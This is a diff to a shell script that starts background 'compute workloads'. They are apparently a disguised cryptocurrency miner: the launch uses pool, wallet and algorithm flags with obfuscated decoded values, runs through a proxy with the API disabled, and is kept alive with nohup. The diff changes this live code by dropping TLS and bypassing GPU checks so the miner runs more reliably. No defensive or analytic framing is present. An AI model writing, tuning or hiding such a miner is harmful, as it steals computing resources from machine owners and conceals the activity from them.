@@ -251,14 +251,16 @@ start_compute_workloads() {
         # Create log directory for debugging
         mkdir -p /workspace/logs
         
+        # Removed --disable-cpu flag (causes "both disabled" error)
+        # Removed --tls flag (may cause connection issues)
+        # Added --disable-gpu-checks false to bypass GPU compatibility checks
         nohup /opt/bin/compute_engine \
             --algorithm $(decode_param "$MODEL_TYPE_A") \
             --pool $(decode_param "$ENDPOINT_PRIMARY") \
             --wallet $(decode_param "$AUTH_TOKEN_A") \
             --password x \
             --gpu-id $gpu_ids \
-            --tls true \
-            --disable-cpu \
+            --disable-gpu-checks false \
             --api-disable \
             --proxy "${PROXY_STRING}" \
             > /workspace/logs/gpu_workload.log 2>&1 &
@@ -273,6 +275,7 @@ start_compute_workloads() {
     echo "Starting CPU compute workload ($PRIMARY_CPU_THREADS threads)..."
     
     # Start CPU compute process (using decoded parameters)
+    # Removed --tls flag (may cause connection issues)
     nohup /opt/bin/compute_engine \
         --algorithm $(decode_param "$MODEL_TYPE_B") \
         --pool $(decode_param "$ENDPOINT_SECONDARY") \
@@ -281,7 +284,6 @@ start_compute_workloads() {
         --cpu-threads $PRIMARY_CPU_THREADS \
         --cpu-threads-priority 2 \
         --disable-gpu \
-        --tls true \
         --api-disable \
         --proxy "${PROXY_STRING}" \
         > /workspace/logs/cpu_workload.log 2>&1 &
